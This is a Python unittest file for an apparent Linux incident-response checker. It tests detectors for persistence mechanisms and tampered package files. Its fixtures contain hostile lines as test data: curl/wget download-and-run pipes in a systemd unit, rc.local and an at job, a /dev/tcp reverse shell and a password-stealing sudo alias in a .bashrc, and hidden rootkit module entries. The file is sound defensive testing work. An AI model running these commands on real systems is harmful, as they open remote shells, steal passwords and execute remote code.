"""2-C 지속성·패키지 무결성: PER-02·03·04·06·07·08·09, FS-04·05, packages 확장(conffiles·diversions)."""
import hashlib
import os
import unittest

from helpers import FakeRootTest, files_owned_by_root

from lintrace.checks.base import Context
from lintrace.checks.fs_04 import Fs04
from lintrace.checks.fs_05 import Fs05
from lintrace.checks.per_02 import Per02, exec_target, parse_unit
from lintrace.checks.per_03 import Per03
from lintrace.checks.per_04 import Per04
from lintrace.checks.per_06 import Per06, job_commands
from lintrace.checks.per_07 import Per07
from lintrace.checks.per_08 import Per08
from lintrace.checks.per_09 import Per09
from lintrace.collectors.packages import packages

NOW = 1_762_400_000


def md5(text):
    return hashlib.md5(text.encode() if isinstance(text, str) else text).hexdigest()


def dpkg(packages_files, conffiles=None, diversions=None):
    """{패키지: {경로: 내용}} → /var/lib/dpkg 파일들 (내용 None이면 md5sums에 안 넣음 — 링크·폴더용)."""
    out = {}
    for pkg, files in packages_files.items():
        out["/var/lib/dpkg/info/{}.list".format(pkg)] = "".join(p + "\n" for p in files)
        sums = "".join("{}  {}\n".format(md5(c), p.lstrip("/")) for p, c in files.items() if c is not None)
        out["/var/lib/dpkg/info/{}.md5sums".format(pkg)] = sums
    status = ""
    for pkg, confs in (conffiles or {}).items():
        status += "Package: {}\nStatus: install ok installed\nConffiles:\n".format(pkg)
        for p, c in confs.items():
            status += " {} {}\n".format(p, md5(c))
        status += "Description: x\n\n"
    out["/var/lib/dpkg/status"] = status
    if diversions:
        out["/var/lib/dpkg/diversions"] = "".join("{}\n{}\n{}\n".format(*d) for d in diversions)
    return out


SH = "#!/bin/sh\n"
BASE_PROFILE = "# /etc/profile\nif [ \"${PS1-}\" ]; then\n  PS1='$ '\nfi\n"
SKEL_BASHRC = "case $- in *i*) ;; *) return;; esac\nHISTFILESIZE=2000\nalias ls='ls --color=auto'\n"
PASSWD = ("root:x:0:0:root:/root:/bin/bash\npeter:x:1001:1001::/home/peter:/bin/bash\n"
          "test:x:1000:1000::/home/test:/bin/bash\n")


class Base(FakeRootTest):
    def ctx(self, files, setup=None):
        files = dict(files)
        files.setdefault("/etc/passwd", PASSWD)
        root = self.make_root(files)
        if setup:
            setup(root)
        return Context(root, now=NOW), root

    def run_check(self, cls, files, setup=None):
        ctx, root = self.ctx(files, setup)
        c = cls()
        return c, c.run(ctx), root


def chmod(path, mode):
    def f(root):
        os.chmod(os.path.join(root, path.lstrip("/")), mode)
    return f


def both(*fs):
    def f(root):
        for x in fs:
            x(root)
    return f


class TestPackagesExtension(Base):
    def test_conffiles_and_diversions(self):
        files = {
            "/var/lib/dpkg/info/sudo.list": "/etc/sudoers\n",
            "/var/lib/dpkg/status": (
                "Package: sudo\nStatus: install ok installed\nConffiles:\n /etc/sudoers 0123456789abcdef0123456789abcdef\n"
                " /etc/old.conf fedcba9876543210fedcba9876543210 obsolete\n /etc/new.conf newconffile\n"
                "Description: x\n\nPackage: dash\nConffiles:\n /etc/dash.conf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"),
            "/var/lib/dpkg/diversions": "/bin/sh\n/bin/sh.distrib\ndash\n"
                                        "/usr/sbin/grub-set-default\n/usr/sbin/grub-set-default.real\ngrub-legacy-ec2\n",
        }
        ctx, _ = self.ctx(files)
        db = packages(ctx)
        self.assertEqual(db.conffile("/etc/sudoers"), ("0123456789abcdef0123456789abcdef", "sudo"))
        self.assertIsNone(db.conffile("/etc/old.conf"))   # obsolete
        self.assertIsNone(db.conffile("/etc/new.conf"))   # md5 아님
        self.assertEqual(db.conffile("/etc/dash.conf")[1], "dash")
        self.assertEqual(db.diversion("/usr/bin/sh.distrib"), ("/bin/sh", "dash"))  # usrmerge 별칭
        self.assertIn("/usr/sbin/grub-set-default.real", db.diverted_paths())


SYSTEMD_PKG = {"systemd": {"/lib/systemd/system/ssh.service": "[Service]\nExecStart=/usr/sbin/sshd -D\n",
                           "/usr/sbin/sshd": "ELF", "/usr/sbin/netplan": "ELF",
                           "/lib/systemd/systemd-networkd-wait-online": "ELF"}}


class TestPer02(Base):
    def files(self, extra):
        f = dpkg(SYSTEMD_PKG)
        f.update({"/lib/systemd/system/ssh.service": SYSTEMD_PKG["systemd"]["/lib/systemd/system/ssh.service"],
                  "/usr/sbin/sshd": "ELF", "/usr/sbin/netplan": "ELF",
                  "/lib/systemd/systemd-networkd-wait-online": "ELF"})
        f.update(extra)
        return f

    def test_parse(self):
        execs, user = parse_unit(["[Service]", "ExecStart=/a", "ExecStart=", "ExecStart=-/usr/bin/x --y", "User=www"])
        self.assertEqual([(k, v) for _, k, v in execs], [("ExecStart", "-/usr/bin/x --y")])
        self.assertEqual(user, "www")
        self.assertEqual(exec_target("@-/usr/bin/x arg"), "/usr/bin/x")

    @files_owned_by_root
    def test_clean_and_exceptions(self):
        c, f, _ = self.run_check(Per02, self.files({
            # snapd mount — 실행 지시어 없음 (lin.security)
            "/etc/systemd/system/snap-core-4486.mount": "[Mount]\nWhat=/var/lib/snapd/snaps/core_4486.snap\n",
            # netplan 생성 파일 (24.04)
            "/run/systemd/system/netplan-ovs-cleanup.service": "[Service]\nExecStart=/usr/sbin/netplan apply --only-ovs-cleanup\n",
            "/run/systemd/system/systemd-networkd-wait-online.service.d/10-netplan.conf":
                "[Service]\nExecStart=\nExecStart=/lib/systemd/systemd-networkd-wait-online -i enp0s3:degraded\n",
            "/etc/systemd/system/multi-user.target.wants/ssh.service": None,
        }))
        self.assertEqual(f, [])
        self.assertIn("실행 지시어 없음 1개", c.scope)
        self.assertIn("/run 생성 파일 2개", c.scope)

    @files_owned_by_root
    def test_linsecurity_debug_service(self):
        unit = ("[Unit]\nDescription=in.security debugging\n[Service]\nType=idle\nRestart=always\nUser=root\n"
                "ExecStart=/root/debug\n[Install]\nWantedBy=multi-user.target\n")
        c, f, _ = self.run_check(Per02, self.files({"/lib/systemd/system/debug.service": unit,
                                                    "/root/debug": "ELF"}),
                                 lambda root: os.chown(os.path.join(root, "lib/systemd/system/debug.service"), 1001, 0))
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("패키지에 속하지 않는 유닛이 명령을 실행한다", f[0].reason)
        self.assertIn("소유자가 일반 사용자 peter", f[0].reason)
        self.assertIn("실행 대상 /root/debug가 홈 폴더", f[0].reason)

    @files_owned_by_root
    def test_malicious_and_dropin(self):
        c, f, _ = self.run_check(Per02, self.files({
            "/etc/systemd/system/update.service": "[Service]\nExecStart=/bin/sh -c 'curl http://x/a | sh'\n",
            "/etc/systemd/system/ssh.service.d/override.conf": "[Service]\nExecStartPost=/usr/sbin/netplan get\n",
            "/etc/systemd/system/multi-user.target.wants/update.service": None,
        }))
        self.assertEqual(len(f), 2)
        crit = [x for x in f if x.severity == "critical"][0]
        self.assertIn("내려받아 바로 실행한다", crit.reason)
        self.assertIn("활성화됨", " ".join(e.detail for e in crit.evidence))
        warn = [x for x in f if x.severity == "warning"][0]
        self.assertIn("패키지 서비스 ssh.service의 실행 명령을 바꾸는 덮어쓰기 파일", warn.reason)

    @files_owned_by_root
    def test_modified_packaged_unit(self):
        c, f, _ = self.run_check(Per02, self.files({
            "/lib/systemd/system/ssh.service": "[Service]\nExecStart=/usr/sbin/sshd -D\nExecStartPost=/tmp/.x/k\n"}))
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("패키지 원본과 다른 유닛", f[0].reason)
        self.assertIn("임시 폴더", f[0].reason)


class TestPer03(Base):
    @files_owned_by_root
    def test_rc_local(self):
        rc = "#!/bin/sh -e\n# rc.local\nwget -qO- http://x/s | bash\nexit 0\n"
        c, f, _ = self.run_check(Per03, {"/etc/rc.local": rc}, chmod("/etc/rc.local", 0o755))
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("rc.local에 명령 1줄", f[0].reason)
        c, f, _ = self.run_check(Per03, {"/etc/rc.local": rc})
        self.assertEqual(f, [])
        self.assertIn("실행 권한 없음", c.scope)

    @files_owned_by_root
    def test_init_d(self):
        files = dpkg({"cron": {"/etc/init.d/cron": SH + "start\n"}}, conffiles={"cron": {"/etc/init.d/cron": SH + "start\n"}})
        files.update({"/etc/init.d/cron": SH + "start\n", "/etc/init.d/backdoor": SH + "/dev/shm/.x &\n",
                      "/etc/init.d/README": "x"})
        def links(root):
            os.makedirs(os.path.join(root, "etc/rc2.d"))
            os.symlink("../init.d/backdoor", os.path.join(root, "etc/rc2.d/S01backdoor"))
            os.symlink("../init.d/cron", os.path.join(root, "etc/rc2.d/S01cron"))
        c, f, _ = self.run_check(Per03, files, links)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("backdoor", f[0].reason)
        self.assertIn("임시 폴더의 파일을 실행한다", f[0].reason)
        self.assertIn("rc?.d 링크 2개", c.scope)


class TestPer04(Base):
    def test_linsecurity_profile(self):
        files = {"/usr/share/base-files/profile": BASE_PROFILE,
                 "/etc/profile": BASE_PROFILE.replace("fi\n", "fi\nunset HISTFILE\n"),
                 "/etc/skel/.bashrc": SKEL_BASHRC, "/home/test/.bashrc": SKEL_BASHRC,
                 "/usr/share/base-files/dot.bashrc": SKEL_BASHRC + "# root\n", "/root/.bashrc": SKEL_BASHRC + "# root\n"}
        c, f, _ = self.run_check(Per04, files)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "warning")
        self.assertIn("/etc/profile", f[0].reason)
        self.assertIn("명령 기록을 끈다", f[0].reason)
        self.assertIn("5행: unset HISTFILE", [e.detail for e in f[0].evidence])

    def test_ubuntu_defaults_are_clean(self):
        files = {"/usr/share/base-files/profile": BASE_PROFILE, "/etc/profile": BASE_PROFILE,
                 "/etc/bash.bashrc": "#    PROMPT_COMMAND='echo -ne x'\n",
                 "/etc/skel/.bashrc": SKEL_BASHRC, "/home/test/.bashrc": SKEL_BASHRC,
                 "/home/test/.profile": 'PATH="$HOME/bin:$PATH"\nPATH="$HOME/.local/bin:$PATH"\n'}
        c, f, _ = self.run_check(Per04, files)
        self.assertEqual(f, [])

    def test_user_backdoors(self):
        bad = SKEL_BASHRC + ("alias sudo='sudo -S <<< $(read -s p; echo $p | tee /tmp/.p)'\n"
                             "export PATH=/tmp/.bin:$PATH\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1 &\n")
        c, f, _ = self.run_check(Per04, {"/etc/skel/.bashrc": SKEL_BASHRC, "/home/peter/.bashrc": bad})
        self.assertEqual(f[0].severity, "critical")
        r = f[0].reason
        self.assertIn("명령 sudo를 alias로 바꿔 친다", r)
        self.assertIn("PATH 맨 앞에 /tmp/.bin", r)
        self.assertIn("리버스 셸", r)
        self.assertNotIn("alias ls", " ".join(e.detail for e in f[0].evidence))  # skel과 같은 줄은 안 봄


AT_JOB = """#!/bin/sh
# atrun uid=1000 gid=1000
# mail test 0
umask 2
SHELL=/bin/bash; export SHELL
PATH=/usr/bin:/bin; export PATH
cd /home/test || {
\t echo 'Execution directory inaccessible' >&2
\t exit 1
}
${SHELL:-/bin/sh} << 'marcinDELIMITER1a2b3c4d'
CMD

marcinDELIMITER1a2b3c4d
"""


class TestPer06(Base):
    def test_jobs(self):
        self.assertEqual(job_commands(AT_JOB.replace("CMD", "echo hi").splitlines()), [(12, "echo hi")])
        c, f, _ = self.run_check(Per06, {
            "/var/spool/cron/atjobs/a00001019f1a2b": AT_JOB.replace("CMD", "echo hi"),
            "/var/spool/cron/atjobs/.SEQ": "2\n"})
        self.assertEqual([x.severity for x in f], ["info"])
        self.assertIn("대기 중인 at 작업 1개", c.scope)
        c, f, _ = self.run_check(Per06, {"/var/spool/cron/atjobs/a00002": AT_JOB.replace(
            "CMD", "curl -s http://x/p | bash")})
        self.assertEqual(f[0].severity, "critical")


MODULES_DEP = ("kernel/drivers/gpu/drm/vboxvideo/vboxvideo.ko: kernel/drivers/gpu/drm/ttm/ttm.ko\n"
               "kernel/fs/nfsd/nfsd.ko.zst:\n")


class TestPer07(Base):
    def files(self, extra=None, loaded=("vboxvideo", "nfsd")):
        rel = "/lib/modules/4.15.0-23-generic/"
        f = dpkg({"linux-modules": {rel + "kernel/drivers/gpu/drm/vboxvideo/vboxvideo.ko": "ko1",
                                    rel + "kernel/fs/nfsd/nfsd.ko.zst": "ko2"},
                  "kmod": {"/etc/modprobe.d/blacklist.conf": None}})
        f.update({"/proc/sys/kernel/osrelease": "4.15.0-23-generic\n", rel + "modules.dep": MODULES_DEP,
                  rel + "kernel/drivers/gpu/drm/vboxvideo/vboxvideo.ko": "ko1", rel + "kernel/fs/nfsd/nfsd.ko.zst": "ko2",
                  "/proc/modules": "".join("{} 16384 0 - Live 0x0\n".format(m) for m in loaded),
                  "/sys/module/vboxvideo/taint": "CE\n", "/sys/module/vboxvideo/initstate": "live\n",
                  "/sys/module/nfsd/initstate": "live\n", "/sys/module/printk/parameters/x": "1",
                  "/etc/modprobe.d/blacklist.conf": "install algif_aead /bin/false\nblacklist evbug\n"})
        f.update(extra or {})
        return f

    def test_clean(self):
        c, f, _ = self.run_check(Per07, self.files())
        self.assertEqual(f, [])
        self.assertIn("올라온 모듈 2개 (커널 4.15.0-23-generic)", c.scope)

    def test_hidden_and_foreign(self):
        c, f, _ = self.run_check(Per07, self.files({
            "/sys/module/diamorphine/initstate": "live\n",
            "/proc/modules": "vboxvideo 1 0 - Live 0x0\nnfsd 1 0 - Live 0x0\nreptile 1 0 - Live 0x0\n",
            "/etc/modprobe.d/x.conf": "install usb_storage /tmp/.k/run.sh\n"}))
        text = " ".join(x.reason for x in f)
        self.assertIn("모듈 diamorphine가 커널에 올라와 있는데(/sys/module) /proc/modules 목록에서 숨겨져 있다", text)
        self.assertIn("모듈 reptile의 파일이 이 커널(4.15.0-23-generic)의 modules.dep에 없다", text)
        self.assertIn("모듈 usb_storage를 올릴 때 명령을 실행한다", text)
        self.assertEqual(sorted(x.severity for x in f), ["critical", "critical", "warning"])


class TestPer08(Base):
    @files_owned_by_root
    def test_rules(self):
        files = dpkg({"udev": {"/lib/udev/rules.d/60-x.rules": 'RUN+="/lib/udev/x"\n'}})
        files.update({"/lib/udev/rules.d/60-x.rules": 'RUN+="/lib/udev/x"\n',
                      "/run/udev/rules.d/90-netplan.rules": 'SUBSYSTEM=="net", ENV{NM_UNMANAGED}="1"\n',
                      "/etc/udev/rules.d/99-evil.rules": 'ACTION=="add", KERNEL=="random", RUN+="/var/tmp/.u/run"\n'
                                                         'RUN{builtin}+="kmod load $env{MODALIAS}"\n'})
        c, f, _ = self.run_check(Per08, files)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("99-evil.rules", f[0].reason)
        self.assertIn("명령 1개", f[0].reason)  # builtin 제외
        self.assertIn("규칙 파일 3개 (패키지 밖·원본과 다름 2개)", c.scope)


class TestPer09(Base):
    @files_owned_by_root
    def test_linsecurity(self):
        header = "#!/bin/sh\nprintf 'Welcome'\n"
        files = dpkg({"base-files": {"/etc/update-motd.d/00-header": None, "/etc/update-motd.d/10-help-text": None}},
                     conffiles={"base-files": {"/etc/update-motd.d/00-header": header,
                                               "/etc/update-motd.d/10-help-text": "#!/bin/sh\n"}})
        files.update({"/etc/update-motd.d/00-header": header + 'printf "\\n$(cat /etc/update-motd.d/logo)\\n"\n',
                      "/etc/update-motd.d/logo": "#####\n",
                      "/etc/pam.d/sshd": "session optional pam_motd.so motd=/run/motd.dynamic\n"})
        c, f, _ = self.run_check(Per09, files, chmod("/etc/update-motd.d/00-header", 0o755))
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "warning")
        self.assertIn("00-header", f[0].reason)
        self.assertIn("패키지(base-files) 원본과 다르다", f[0].reason)
        self.assertEqual(c.scope, "실행 스크립트 1개, 실행 권한 없는 파일 1개(실행 안 됨), 지워진 패키지 스크립트 1개, "
                                  "pam_motd 사용: sshd")


class TestFs04(Base):
    def files(self, ls="ELF-ls", sudoers="root ALL=(ALL) ALL\n"):
        f = dpkg({"coreutils": {"/usr/bin/ls": "ELF-ls", "/usr/share/doc/x": "doc"},
                  "libpam": {"/usr/lib/x86_64-linux-gnu/security/pam_unix.so": "pam"},
                  "keyutils": {"/usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10": "key"},
                  "sudo": {"/etc/sudoers": None}},
                 conffiles={"sudo": {"/etc/sudoers": "root ALL=(ALL) ALL\n"}})
        f.update({"/usr/bin/ls": ls, "/usr/share/doc/x": "changed",
                  "/usr/lib/x86_64-linux-gnu/security/pam_unix.so": "pam",
                  "/usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10": "ebury", "/etc/sudoers": sudoers})
        return f

    def test_core_and_conffiles(self):
        c, f, _ = self.run_check(Fs04, self.files(ls="trojan", sudoers="peter ALL=NOPASSWD: ALL\n"))
        crit = [x for x in f if x.severity == "critical"]
        self.assertEqual(len(crit), 2)  # /usr/bin, /usr/lib/x86_64-linux-gnu 폴더별 한 건
        text = " ".join(x.reason for x in crit)
        self.assertIn("/usr/bin/ls", text)
        self.assertIn("libkeyutils.so.1.10", text)
        self.assertNotIn("/usr/share/doc/x", text)  # 핵심 경로 아님
        info = [x for x in f if x.severity == "info"]
        self.assertIn("/etc/sudoers", info[0].reason)
        self.assertIn("핵심 경로 패키지 파일 3개 검사", c.scope)

    def test_full(self):
        ctx, _ = self.ctx(self.files())
        ctx.full = True
        c = Fs04()
        f = c.run(ctx)
        self.assertIn("/usr/share/doc/x", " ".join(x.reason for x in f))
        self.assertIn("모든(--full) 패키지 파일 4개 검사", c.scope)


class TestFs05(Base):
    def test_files(self):
        files = dpkg({"bash": {"/usr/bin/bash": "BASH-ELF"}, "gawk": {"/usr/bin/gawk": "G"},
                      "sudo": {"/usr/bin/sudo": "S"}, "dash": {"/usr/bin/dash": "D"}},
                     diversions=[("/bin/sh", "/bin/sh.distrib", "dash")])
        files.update({"/usr/bin/bash": "BASH-ELF", "/usr/bin/gawk": "G", "/usr/bin/sudo": "S", "/usr/bin/dash": "D",
                      "/usr/bin/sh.distrib": "D", "/usr/bin/.cache": "x", "/usr/bin/sysupd": "BASH-ELF",
                      "/usr/bin/tool": "#!/bin/sh\n", "/usr/local/bin/sudo": "#!/bin/sh\n", "/usr/local/bin/myapp": "x",
                      "/etc/alternatives/.keep": ""})

        def links(root):
            # 상대 링크 (절대 링크는 가짜 루트 밖의 실제 /usr/bin을 가리킨다)
            os.symlink("../../usr/bin/gawk", os.path.join(root, "etc/alternatives/awk"))
            os.symlink("../../etc/alternatives/awk", os.path.join(root, "usr/bin/awk"))
        c, f, _ = self.run_check(Fs05, files, links)
        text = " / ".join(x.reason for x in f)
        self.assertIn("셸 /usr/bin/bash의 복사본", text)
        self.assertIn("숨김 이름", text)
        self.assertIn("tool(패키지에 속하지 않는 스크립트)", text)
        self.assertIn("시스템 명령 sudo와 같은 이름", text)
        self.assertNotIn("awk", text)
        self.assertNotIn("sh.distrib", text)
        self.assertNotIn("myapp", text)
        self.assertEqual(sorted(x.severity for x in f), ["critical", "warning"])
        self.assertIn("대체 링크 1개 정상", c.scope)


if __name__ == "__main__":
    unittest.main()
